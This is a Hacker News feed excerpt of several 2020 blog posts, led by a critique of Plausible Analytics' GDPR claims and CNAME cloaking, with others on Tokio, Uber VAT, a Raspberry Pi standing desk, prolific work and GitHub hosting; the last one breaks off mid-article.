<![CDATA[Plausible Analytics Isn't GDPR Compliant]]>
            </title>
            <description>
<![CDATA[
Score 52 | Comments 72 (<a href="https://news.ycombinator.com/item?id=24868012">thread link</a>) | @ramboram
<br/>
October 23, 2020 | https://blog.paranoidpenguin.net/2020/07/plausible-analytics-review-browser-fingerprinting-and-cname-cloaking | <a href="https://web.archive.org/web/*/https://blog.paranoidpenguin.net/2020/07/plausible-analytics-review-browser-fingerprinting-and-cname-cloaking">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For the last few weeks, my feeds and federated timelines have been filled with absolutely brilliant marketing campaigns for Plausible Analytics, the new open-source privacy-focused website analytics tool. Plausible Analytics has enjoyed exponential growth and is frequently recommended by privacy-conscious voices in the FOSS community.</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/elementary-io.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/elementary-io-663x317.png" alt="Plausible Analytics - elementary OS"></a><figcaption><p>Plausible Analytics showing public visitor metrics for the elementary OS website.</p></figcaption></figure><p>So does Plausible Analytics deliver on its promise to provide an ethical privacy-friendly alternative to Google Analytics? Let’s have a closer look.</p><p>Plausible Analytics claims to be compliant with GDPR, CCPA, and PECR out of the box. Allegedly, it’s not necessary to ask for and obtain user consent as no personal data is ever being collected.</p><p>Plausible Analytics does however admit that it collects your user-agent and IP address to uniquely identify your visit. Additionally, it stores information about your browser, operating system, device type, and location (based on your IP address). Even if the stored personal data is being anonymized (and not pseudonymized which sounds more likely), the data is still being processed.</p><p>If you’re familiar with GDPR, then you’re likely aware that it certainly covers collecting of online identifiers, such as IP addresses, and browser characteristics used for fingerprinting.</p><p>Another issue I came across when signing up for their service was that Plausible Analytics doesn’t provide their customers with a GDPR data processing agreement (DPA). When you, the website owner, allows a third party to collect and process personal data, you’re required to sign a DPA to be GDPR compliant.</p><h2 id="privacy-friendly-website-analytics">Privacy-friendly website analytics</h2><p>In my opinion, privacy-friendly should be more than a buzzword used to throw shade at Google Analytics. Here are a few key points that I attribute to being privacy-friendly (none of which are adhered to by Plausible Analytics):</p><ul><li>Ask users for their consent before tracking.</li><li>Allow users who don’t want to be tracked to opt-out.</li><li>Respect users providing a Do Not Track (DNT) header.</li><li>Don’t disguise your tracker as a first-party resource to avoid ad-blockers.</li></ul><p>Being privacy-friendly is also about respecting one’s right to choose what data to share, and with whom. Plausible Analytics seems to think that it’s alright to make that choice on your behalf and I wholeheartedly disagree.</p><h2 id="cname-cloaking">CNAME cloaking</h2><p>This abysmal technique remains ever popular with <a href="https://github.com/uBlockOrigin/uBlock-issues/issues/780" target="_blank">unethical advertisers</a> as an effective countermeasure against ad-blockers. The technique effectively disguises the third-party tracker as a first-party resource by having the website owner pointing a subdomain to the third-party server using a CNAME record.</p><p>Plausible Analytics are at least upfront about why they deploy CNAME cloaking, as explained in their documentation:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/plausible-cname-cloaking.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/plausible-cname-cloaking-663x277.png" alt="Plausible Analytics - CNAME cloaking"></a><figcaption><p>Plausible Analytics documenting how to defeat ad-blockers.</p></figcaption></figure><p>What, some people are trying to block your privacy-friendly tracker? Now we can’t have that, tracking absolutely everyone gives Plausible Analytics a competitive edge against Google Analytics.</p><h3 id="how-does-cname-cloaking-work">How does CNAME cloaking work?</h3><p>An excellent question, but first we need to understand exactly what makes CNAMEs special by design and implementation as according to <a href="https://tools.ietf.org/html/rfc1034" target="_blank">rfc1034</a>.</p><blockquote><div><p>A CNAME RR identifies its name as an alias, and specifies the corresponding canonical name.</p><p>When a name server fails to find a desired RR in the resource set associated with the domain name, it checks to see if the resource set consists of a CNAME record with a matching class. If so, the name server includes the CNAME record in the response and restarts the query at the domain name specified in the data field of the CNAME record.</p></div></blockquote><p>Let’s see how it works by using the domain markosaric.com as an example. The domain is owned by Marko Saric, digital marketing guru of team Plausible Analytics. The subdomain he uses to disguise the tracker is ms.markosaric.com.
When performing a DNS query for ms.markosaric.com, we get the following response:</p><pre><code>$ dig ms.markosaric.com

;; ANSWER SECTION:
ms.markosaric.com.	14400	IN	CNAME	custom.plausible.io.
custom.plausible.io.	300	IN	A	46.101.161.209
</code></pre><p>As we can tell, the DNS resolver identifies ms.markosaric.com as an alias for custom.plausible.io. Additionally, because it’s a CNAME record, we also get the A record for custom.plausible.io which is pointing to 46.101.161.209.</p><p>When a browser requests the first-party resource for ms.markosaric.com, the same “DNS based redirect” takes place, and the tracker gets inserted from custom.plausible.io. However, because this happens at the DNS level, ad-blockers are unable to identify the tracker.</p><p>Let’s see how this dark magic repels uBlock Origin on Chromium after adding a custom filter to block the plausible.io domain.</p><pre><code>! Custom uBlock Origin filter for plausible.io
||plausible.io^
</code></pre><p>The image below consists of two merged screenshots. The left side of the image shows how the custom filter fails to stop the tracker when CNAME cloaking is in effect. The right side of the image shows the same filter successfully blocking the tracking domain when accessed directly:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-cloak.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-cloak-663x232.png" alt="CNAME cloaking"></a><figcaption><p>CNAME cloaking used to escape filtering from uBlock Origin on Chromium.</p></figcaption></figure><p>As shown above, the tracker (index.js) is being loaded from the remote IP address of 46.101.161.209, which resolves to custom.plausible.io. However, the script is not blocked and the harvesting of personal data is in full effect.</p><p>This technique is effective because uBlock Origin doesn’t have access to DNS queries and is entirely oblivious to the trick being pulled behind its back. I wouldn’t describe this approach as being either privacy-friendly or ethical.</p><h2 id="how-to-block-plausible-analytics">How to block Plausible Analytics</h2><p>Though intrusive, unethical, and annoying, CNAME cloaking can be defeated. I’ll scratch the surface with a few options that will help you to protect your privacy.</p><h3 id="ublock-origin-on-firefox">uBlock Origin on Firefox</h3><p>You can easily block Plausible Analytics with uBlock Origin on Firefox by adding the filter I referenced earlier in this article. Firefox allows extensions (if given permission) to resolve domain names by exposing a <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dns" target="_blank">DNS API</a>. This allows uBlock Origin to identify and block disguised trackers:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-exposed-ublock-origin.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-exposed-ublock-origin.png" alt="uBlock Origin on Firefox"></a><figcaption><p>uBlock Origin using Firefox’s DNS API to expose and block CNAME cloaking.</p></figcaption></figure><h3 id="dnscrypt-proxy">dnscrypt-proxy</h3><p>If you don’t want to use Firefox, or prefer to block Plausible Analytics on the DNS level, then you’ll need a tool that can scrub CNAME responses. The right tool for the job in my opinion is <a href="https://github.com/DNSCrypt/dnscrypt-proxy" target="_blank">dnscrypt-proxy</a>. The dnscrypt-proxy client’s domain blacklist provides support for CNAME blocking.</p><p>The following animated gif shows how dnscrypt-proxy can block the CNAME record containing the unwanted tracker.</p><p><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/dnscrypt-proxy-cname-blacklist.gif" alt="dnscrypt-prox blocking a cloaked CNAME record" title="Blocking Plausible Analytics with dnscrypt-proxy"></p><p>Pretty neat huh.</p><h3 id="other-options">Other options</h3><p>Well there are a few, you could always:</p><ul><li>Block any IP address in use by custom.plausible.io with your firewall.</li><li>Disable JavaScript in your browser (it will block the tracking, not the connection).</li><li>Block the <a href="https://github.com/rogercomply/plausible-analytics-blocklist/blob/master/subdomains" target="_blank" rel="noopener noreferrer nofollow" title="A list of subdomains used for CNAME cloaking with Plausible Analytics">subdomains</a> used for CNAME cloaking.</li><li>Use a DNS service provider already blocking unwanted trackers.</li><li>Ask Plausible Analytics to respect your right to privacy.</li></ul><h2 id="what-does-the-foss-say">What does the FOSS say?</h2><p>I’ll admit to being mildly amused and surprised that privacy-conscious people in the FOSS community are promoting this service. Even more surprising is the fact that they’re configuring CNAME cloaking for their websites. I mean, seriously, you can’t exactly argue ignorance in this matter.</p><p>Plausible Analytics is good at targeted marketing to the right people. However, I don’t personally believe that the product delivers on its promise. Open-source or not, the business model here is still to monetize personal data for profit however you may wish to dress it up.</p></div></div>]]>
            </description>
            <link>https://blog.paranoidpenguin.net/2020/07/plausible-analytics-review-browser-fingerprinting-and-cname-cloaking</link>
            <guid isPermaLink="false">hacker-news-small-sites-24868012</guid>
            <pubDate>Fri, 23 Oct 2020 10:38:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust Tokio Podcast Interview]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24867630">thread link</a>) | @devrustr
<br/>
October 23, 2020 | https://blog.firosolutions.com/2020/10/tokio_special_with_carl_lerche/ | <a href="https://web.archive.org/web/*/https://blog.firosolutions.com/2020/10/tokio_special_with_carl_lerche/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  

<h2 id="tokio-special-with-carl-lerche">Tokio special with Carl Lerche</h2>



<p><a title="Tokio special with Carl Lerche Security Headlines podcast" href="https://anchor.fm/firo-solutions/episodes/Tokio-special-with-Carl-Lerche-elfdvr">
<img alt="podcast Tokio special with Carl Lerche" src="https://blog.firosolutions.com/tokio.png">
</a></p><h2 id="summary">Summary</h2>

<p>In this podcast episode of Security Headlines: Carl Lerche, Rust developer and<br>
maintainer of the popular Rust programming library Tokio joins us.<br>
He walks us through what Rust and Tokio is, how companies are building their stacks with Rust.<br>
This and a lot more on this episode of Security Headlines!</p>

<p>Tune in and listen here:<br>




</p>

<p><a href="https://anchor.fm/firo-solutions/episodes/Tokio-special-with-Carl-Lerche-elfdvr">https://anchor.fm/firo-solutions/episodes/Tokio-special-with-Carl-Lerche-elfdvr</a></p>

<p>Carl heard about this new programming language called Rust and wanted to check it out.
What started as a hobby project led Carl down the rust path and he now works for Amazon as a<br>
Rust developer! Helping Amazon build stable infrastructure.</p>

<p>We get to hear the story of how Tokio got started and how the Rust programming language has changed<br>
over the years.<br>
Since a large chunk of Tokio code is focusing on making it easy for developers to write asynchronous functions.<br>
And be able to write fast code that does not get stuck and lets the data flow.<br>
But how does non-blocking code really work? What differs Rust from the programming language Golang is<br>
Golangs, adoption of green threads instead of using regular threads.<br>
Carl walks us through how this works and how Rust tackles this problem “the Rust way”.</p>

<p>Do you want to build reliable network services with Rust?<br>
Then Tokio is something you should check out, try out the new 0.3 release here:<br>
<a href="https://github.com/tokio-rs/tokio/releases/tag/tokio-0.3.1">https://github.com/tokio-rs/tokio/releases/tag/tokio-0.3.1</a></p>

<h3 id="in-this-episode-we-also-cover">In this episode we also cover:</h3>

<p>slowing down syscalls to protect against Spectre</p>

<p>async syscalls with io-uring</p>

<p>building high-performance systems with non-blocking sockets</p>

<p>writing code without syscalls</p>

<p>getting started with Tokio</p>

<p>async operating system api’s</p>

<p>how to start coding with tokio</p>

<h2 id="external-links">External links:</h2>

<p><a href="https://doc.rust-lang.org/stable/rust-by-example/">https://doc.rust-lang.org/stable/rust-by-example/</a><br>
<a href="https://discord.gg/tokio">https://discord.gg/tokio</a><br>
<a href="https://tokio.rs/">https://tokio.rs/</a><br>
<a href="https://twitter.com/carllerche">https://twitter.com/carllerche</a><br>
<a href="https://github.com/tokio-rs/">https://github.com/tokio-rs/</a><br>
<a href="https://github.com/tokio-rs/io-uring">https://github.com/tokio-rs/io-uring</a><br>
<a href="https://blogs.oracle.com/linux/an-introduction-to-the-io_uring-asynchronous-io-framework">https://blogs.oracle.com/linux/an-introduction-to-the-io_uring-asynchronous-io-framework</a><br>
<a href="https://www.howtogeek.com/338269/a-huge-intel-security-hole-could-slow-down-your-pc-soon/">https://www.howtogeek.com/338269/a-huge-intel-security-hole-could-slow-down-your-pc-soon/</a><br>
<a href="https://www.rustaceans.org/">https://www.rustaceans.org/</a><br>
<a href="https://rust-lang.github.io/async-book/">https://rust-lang.github.io/async-book/</a><br>
<a href="https://github.com/tokio-rs/mini-redis">https://github.com/tokio-rs/mini-redis</a><br>
<a href="https://pop.system76.com/">https://pop.system76.com/</a><br>
<a href="https://rust-analyzer.github.io/">https://rust-analyzer.github.io/</a><br>
<a href="https://en.wikipedia.org/wiki/Epoll">https://en.wikipedia.org/wiki/Epoll</a><br>
<a href="https://twitter.com/tokio_rs">https://twitter.com/tokio_rs</a><br>
<a href="https://github.com/carllerche">https://github.com/carllerche</a></p>

</div></div>]]>
            </description>
            <link>https://blog.firosolutions.com/2020/10/tokio_special_with_carl_lerche/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24867630</guid>
            <pubDate>Fri, 23 Oct 2020 09:46:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Good Law Project Forces HMRC to Collect £1.5bn in VAT from Uber]]>
            </title>
            <description>
<![CDATA[
Score 26 | Comments 11 (<a href="https://news.ycombinator.com/item?id=24867410">thread link</a>) | @davidgerard
<br/>
October 23, 2020 | https://goodlawproject.org/update/hmrc-to-collect-1-5bn-uber/ | <a href="https://web.archive.org/web/*/https://goodlawproject.org/update/hmrc-to-collect-1-5bn-uber/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
            

            <div id="page">
                <p><span>Way back in April 2017, we announced we were going to take on HMRC’s</span> <a href="https://rebrand.ly/data-parliament-2017">failure to assess</a> <span>Uber to VAT which corroded public trust, not only in HMRC, but in politics more generally.Â&nbsp;</span></p>
<p><span>And itâ€™s been quite the scrap…Â&nbsp;</span></p>
<p><span>There have been lows – like us spending the money we raised in the crowdfunder trying to get a protective costs order and failing.Â&nbsp;</span></p>
<p><span>And there have been highs – like us persuading the High Court </span><a href="https://rebrand.ly/ewhc-2019"><span>late last year</span></a><span> that a fairly spineless HMRC was allowed to do what the legislation plainly allowed it to do and tell us it had (at last) assessed Uber.</span></p>
<p><span>There have been further lows – as last week when the Court of Appeal refused us permission to bring our judicial review against HMRC.</span></p>
<p><span><span>But ultimately </span><span>we triumphed</span><span>. </span></span><a href="https://rebrand.ly/ussec-10q"><span>Uber’s US accounts</span></a><span> now confirm that HMRC has assessed Uber to VAT on fares – both prospectively and retrospectively.</span></p>
<p><span>And thatâ€™s all we ever wanted.Â&nbsp;</span></p>
<p><span><span>It’s been a long, bumpy (and expensive) ride – if you’ll allow me the metaphor – but we have reached our destination. I am so proud that together we have forced HMRC, belatedly, to act – </span><span>Uber has now been asked to pay the Â£1.5bn of tax they owe the public purse.</span></span></p>
<p><span>We couldnâ€™t have done it without your support. So thank you.</span></p>
<p><span>Iâ€™d also like to thank the lawyers – George Peretz QC, Jack Anderson, Hui Ling McCarthy QC, Christopher Knight, David Greene, Vikram Sachdeva QC, and Alex Rook – who helped out, most for even less than the smell of an oily rag, along the way.</span></p>
<hr>
<p><span>It is only with your support that we can continue to hold Government to account. If you would like to make a donation, you can do so</span>Â&nbsp;<a href="https://goodlawproject.org/membership">here</a>.</p>
            </div>
        </div>

        
    </div></div>]]>
            </description>
            <link>https://goodlawproject.org/update/hmrc-to-collect-1-5bn-uber/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24867410</guid>
            <pubDate>Fri, 23 Oct 2020 09:10:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Home Made Raspberry Pi Standing Desk Controller]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24867077">thread link</a>) | @tomahony
<br/>
October 23, 2020 | https://timmyomahony.com/blog/home-made-standing-desk-raspberry-pi-controller | <a href="https://web.archive.org/web/*/https://timmyomahony.com/blog/home-made-standing-desk-raspberry-pi-controller">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><p><time title="14 days, 22 hours, and 12 minutes ago." datetime="2020-10-11T11:14:00+01:00">Sunday 11 October 2020</time></p><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/DSC03717.jpg?mtime=20201011123730&amp;focal=none" alt="DSC03717" title="DSC03717" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/DSC03717.jpg?mtime=20201011123730&amp;focal=none"></figure></div></section><section><div><p>I have a <a href="https://www.conset.com/Product/prod/4333/501-49" target="_blank" rel="noreferrer noopener">Conset 501-49</a> sit/stand desk at home. It's a decent, solid work desk but the default controller that it came with is poor, only allowing you to raise and lower via a set of small push-buttons. This makes it tedious to find the correct height and means you usually just don't bother getting up and standing, making it a rather expensive sit-only-desk.</p><p>Over the lockdown, I decided to improve this by replacing the original buttons with a Raspberry Pi powered controller that would allow me to raise and lower my desk at the click of a single button.<br></p></div></section><section><p>Here's a closer look at it sitting under my desk:</p></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/DSC03725.jpg?mtime=20201011123934&amp;focal=none" alt="DSC03725" title="DSC03725" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/DSC03725.jpg?mtime=20201011123934&amp;focal=none"></figure></div></section><section><div><p>This is <a href="https://shop.pimoroni.com/products/display-o-tron-hat" target="_blank" rel="noreferrer noopener">a DisplayOTron HAT that I bought from Pimoroni</a> a few years ago and never had a proper use for. Thankfully this hat is perfect for this project.</p><ul><li>On the <strong>front</strong> is a LCD display that shows the current height from the ground. This could be reprogrammed to show anything: animations, time standing or sitting, last time the desk was raised or lowered etc. <br></li><li>On the <strong>left</strong> of the display you'll see up/down capacitive buttons. These are programmed to allow me to manually raise or lower the desk, just like the original buttons. <br></li><li>Along the <strong>bottom</strong> are the preset buttons. Hitting the left arrow lowers the desk to my pre-programmed "ground" setting where it's comfortable for me to sit (around 60cm off the ground) while right arrow button raises it to my preset standing position (120cm).</li><li>Along the <strong>right</strong> there's a light-bar. This is really just a decoration, showing the current position of the desk. They light-up individually as the desk goes up. Like a 1-dimensional Christmas tree.<br></li></ul></div></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/DSC03731.f1602436285.jpg?mtime=20201011125310&amp;focal=none" alt="DSC03731" title="DSC03731" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/DSC03731.f1602436285.jpg?mtime=20201011125310&amp;focal=none"><figcaption>
													Superglue, picture hooks and velcro sticky things
																	</figcaption></figure></div></section><section></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_5056.gif?mtime=20201011125820&amp;focal=none" alt="IMG 5056" title="IMG 5056"></figure></div></section><section><div><p>So how does it work?<br></p><p>The relays on the Raspberry Pi allow us to control the underlying electrical circuit to raise/lower the desk via the RPIO's GPIO pins.</p><p>The height sensor detects how high the desk is currently off the ground and allows us to start/stop the motor via the above relays. <br></p><p>Finally, the display allows us to control everything as well as display the current height of the desk.</p><p>There were a few general stages to getting this working:</p><ol><li>Figuring out how the existing switches and motor work.<br></li><li>Replacing the default physical switches with relays.</li><li>Adding the height-sensor.</li><li>Programming everything together.</li></ol><h2>Figuring it Out</h2></div></section><section><p>Admission: I don't know what I'm doing - electricity is magic that spews from the wall, so a lot of this was just me poking an prodding at things while making sure I didn't electrocute myself. Be careful.</p></section><section><div><p>Here's what I knew: my desk had a big black motor sitting underneath. It raised and lowered the table. There were a few wires coming out of it connected to its build-in switch.<br></p><p>To learn more, the first thing I did was open (and effectively destroy) the default switch, to see how it worked inside<br></p></div></section><section><p>Top Tip: destroy things as early as possible so that <em>you have to</em> finish the project</p></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4424.jpg?mtime=20201011134639&amp;focal=none" alt="IMG 4424" title="IMG 4424" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4424.jpg?mtime=20201011134639&amp;focal=none"></figure></div></section><section><div><p>At a basic level it's easy to understand what <a href="https://uk.rs-online.com/web/p/microswitches/2900479/" target="_blank" rel="noreferrer noopener">these switches</a> do: they control how electricity flows to the motor. The circuit is open by default with no electricity flowing. When you press a button, it closes the circuit allowing electricity to flow to the motor which will rise or fall. Which direction the motor runs depends on whether you connect live or neural <sup>[citation needed]</sup><br></p><p>To be able to actually re-wire this though and hook everything up the relays, you need to actually understand it working in more detail. To do this, I cut the switches out (after taking a number of inadequate pictures) and created my own battery-powered circuit to see it in action.</p></div></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4445.f1602436934.jpg?mtime=20201011135726&amp;focal=none" alt="IMG 4445" title="IMG 4445" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4445.f1602436934.jpg?mtime=20201011135726&amp;focal=none"><figcaption>
													It's a mess, but this circuit actually mimics the desk. There are two leds on the breadboard. These lighting up represent the desk raising or lowering.
																	</figcaption></figure></div></section><section><p>If I'm honest, I don't understand this stuff well enough to offer an explanation of exactly how you should do this or how it works in any detail. I did map it all out myself:</p></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/Screenshot-2020-10-11-at-14.26.30.png?mtime=20201011142704&amp;focal=none" alt="Screenshot 2020 10 11 at 14 26 30" title="Screenshot 2020 10 11 at 14 26 30" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/Screenshot-2020-10-11-at-14.26.30.png?mtime=20201011142704&amp;focal=none"></figure></div></section><section><p>But this might be wrong as I did a lot of reconnecting-wires-until-it-worked, so if you're doing something similar, spend some time researching relays and playing with a test circuit yourself before working with anything connected to the mains.<br></p></section><section><div><h2>Adding the Relays</h2><p>With a better idea of how the switches worked, I was able to add the relay board to the Raspberry Pi and test out the circuit before actually hooking it up to the motor.<br></p></div></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4443.f1602422691.jpg?mtime=20201011142401&amp;focal=none" alt="IMG 4443" title="IMG 4443" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4443.f1602422691.jpg?mtime=20201011142401&amp;focal=none"><figcaption>
													Again, here "red" means the desk is rising, "green" means the desk is lowering ... or the other way around, I can't remember
																	</figcaption></figure></div></section><section><p>Finally, with that working, I went on to wire the actual motor up to the Raspberry Pi. Again, this is potentially dangerous. If you're doing this make sure you read-up on it and take some precautions (like cowering in the corner while you flip the switch with a long stick).<br></p></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4448.jpg?mtime=20201011123943&amp;focal=none" alt="IMG 4448" title="IMG 4448" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4448.jpg?mtime=20201011123943&amp;focal=none"></figure></div></section><section><p>
		With everything wired up correctly I could now control both an "up" relay and "down" relay via code.
	</p></section><section><div><h2>Height Sensors</h2><p>With the ability to raise and lower the desk via the relays (and code), I needed to think about how to actually control the desk and get it into a comfortable standing or sitting position automatically.</p><p>One easy approach is to simply raise or lower the desk for a certain amount of time. In other words, to get into the "standing" position just enable the "up" relay for 5 seconds. To go back to "sitting" enable the "down" relay for 5 seconds.</p><p>This doesn't really work though. The desk lowers much more quickly than it raises (due to gravity) so it's very hard to get the correct timings. Furthermore you can easily get out-of-sync, meaning you have to manually adjust the height again, making the whole endeavour pointless (of course I only realised this once I had assembled everything).</p><p>A better approach is to use a height sensor. These are small little devices that send out a sound wave and measure how long it takes to return. With some simple maths you have the height of the ground.<br></p></div></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4499.f1602438374.jpg?mtime=20201011184543&amp;focal=none" alt="IMG 4499" title="IMG 4499" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4499.f1602438374.jpg?mtime=20201011184543&amp;focal=none"><figcaption>
													The height sensor is the little E.T.-looking device in the top right.
																	</figcaption></figure></div></section><section><p>I found a <a href="https://thepihut.com/blogs/raspberry-pi-tutorials/hc-sr04-ultrasonic-range-sensor-on-the-raspberry-pi" target="_blank" rel="noreferrer noopener">few</a><a href="https://pimylifeup.com/raspberry-pi-distance-sensor/" target="_blank" rel="noreferrer noopener">tutorials</a> on setting this up via a small circuit on the breadboard. With some experimentation it was easy to start reading the desk height via Python.<br></p></section><section><div><h2>The Code</h2><p>With all the hardware in place, the final thing was to tie everything together with some Python.</p></div></section><section></section><section><div><p>I don't have much experience programming hardware or embedded devices so I had to tinker with this to get it working. <br></p><p>I ended up using Redis to create a message queue that each part of the controller could communicate through and then using threads to handle most of the various parts of the controller:</p><ul><li><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/buttons.py" target="_blank" rel="noreferrer noopener">Buttons</a><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/lightbar.py" target="_blank" rel="noreferrer noopener"></a></li><li><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/lightbar.py" target="_blank" rel="noreferrer noopener">Lightbar</a></li><li><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/display.py" target="_blank" rel="noreferrer noopener">Display</a><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/relay.py" target="_blank" rel="noreferrer noopener"></a></li><li><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/relay.py" target="_blank" rel="noreferrer noopener">Relays</a></li><li><a href="https://github.com/timmyomahony/standing-desk/blob/master/src/standing_desk/distance.py" target="_blank" rel="noreferrer noopener">Height sensor</a></li></ul><h2>Bonus: Apple Home via Homebridge</h2><p>As an added bonus I also<a href="https://homebridge.io/" target="_blank" rel="noreferrer noopener"> installed Homebridge on the Raspberry Pi</a>, allowing me to control the standing desk via my iPhone/Mac/iPad.</p></div></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/Screenshot-2020-08-30-at-15.26.06.png?mtime=20201011185906&amp;focal=none" alt="Screenshot 2020 08 30 at 15 26 06" title="Screenshot 2020 08 30 at 15 26 06" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/Screenshot-2020-08-30-at-15.26.06.png?mtime=20201011185906&amp;focal=none"></figure></div></section><section><p>To do this I needed to create a plugin for homebridge. You can also see <a href="https://github.com/timmyomahony/homebridge-standing-desk" target="_blank" rel="noreferrer noopener">the code for this on my Github page</a>. I don't actually use this that much to control the desk, but it's a nice added bonus.</p></section><section></section></article></div></div>]]>
            </description>
            <link>https://timmyomahony.com/blog/home-made-standing-desk-raspberry-pi-controller</link>
            <guid isPermaLink="false">hacker-news-small-sites-24867077</guid>
            <pubDate>Fri, 23 Oct 2020 08:05:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Be prolific]]>
            </title>
            <description>
<![CDATA[
Score 306 | Comments 125 (<a href="https://news.ycombinator.com/item?id=24866706">thread link</a>) | @hecticjeff
<br/>
October 22, 2020 | https://www.chrismytton.com/be-prolific/? | <a href="https://web.archive.org/web/*/https://www.chrismytton.com/be-prolific/?">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
<p>There’s a story about an art teacher that split their class in half. They told one half of the students that they’d be graded based on a single piece of work, and the other half that they would be graded on the quantity of work produced.</p>

<p>The half that was being graded on quantity ended up producing higher quality pieces.</p>

<p>By iterating and learning from their mistakes they actually ended up producing better work than the students that only had to produce one piece.</p>

<p>Quantity leads to quality.</p>



<p>Sharing work helps you to think and develop. The feedback you get feeds into the next iteration.</p>

<p>If you’ve enjoyed creating something then there’s a good chance that at least a handful of people in the world will enjoy seeing it or hearing about it.</p>

<p>Promoting yourself and your work can be a good way to clarify your thinking and future direction.</p>

<h2 id="get-better-by-creating-more">Get better by creating more</h2>

<p>Produce lots of stuff and share it.</p>

<p>Being prolific doesn’t mean that everything you produce has to be absolute gold. But the process of producing large quantities of work ultimately leads to a higher quality of work.</p>

    </div></div>]]>
            </description>
            <link>https://www.chrismytton.com/be-prolific/?</link>
            <guid isPermaLink="false">hacker-news-small-sites-24866706</guid>
            <pubDate>Fri, 23 Oct 2020 06:56:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Important Open Source projects should not use GitHub]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 7 (<a href="https://news.ycombinator.com/item?id=24866580">thread link</a>) | @stargrave
<br/>
October 22, 2020 | https://unixsheikh.com/articles/important-open-source-projects-should-not-use-github.html | <a href="https://web.archive.org/web/*/https://unixsheikh.com/articles/important-open-source-projects-should-not-use-github.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>


<p>Published on <span id="published">2020-10-23</span>. Modified on <span id="modified">2020-10-25</span>.</p>
<p>Thousands of the worlds best Open Source projects are still hosting their code repositories on GitHub. Since Microsoft has purchased GitHub this has become a serious problem.</p>
<p><strong>Update 2020-10-25:</strong> This is not directly related as it could happen on other hosting platforms as well, but just a few hours after I wrote this the youtube-dl repository was taken down from GitHub by RIAA due to a <a href="https://github.com/ytdl-org/youtube-dl/">DMCA request</a>.</p>
<p>It is no news that <a href="https://en.wikipedia.org/wiki/GitHub#Acquisition_by_Microsoft">Microsoft purchased GitHub in 2018</a>, everyone knows that. Yet despite that fact thousands of the worlds most important Open Source projects continue to host their code on GitHub. People seem to have forgotten just how rotten Microsoft really is and how dangerous that situation is.</p>
<p>It is not so much the fact that many projects host their projects on GitHub, it is the fact that many projects haven't secured the code outside of GitHub! They rely fully on GitHub to maintain and protect the code.</p>
<p>Microsoft is very actively purchasing important projects related to Open Source and in April 2020 it was announced that they had now also acquired <a href="https://en.wikipedia.org/wiki/Npm_(software)">npm</a>, a JavaScript packaging vendor, for an undisclosed sum of money.</p>
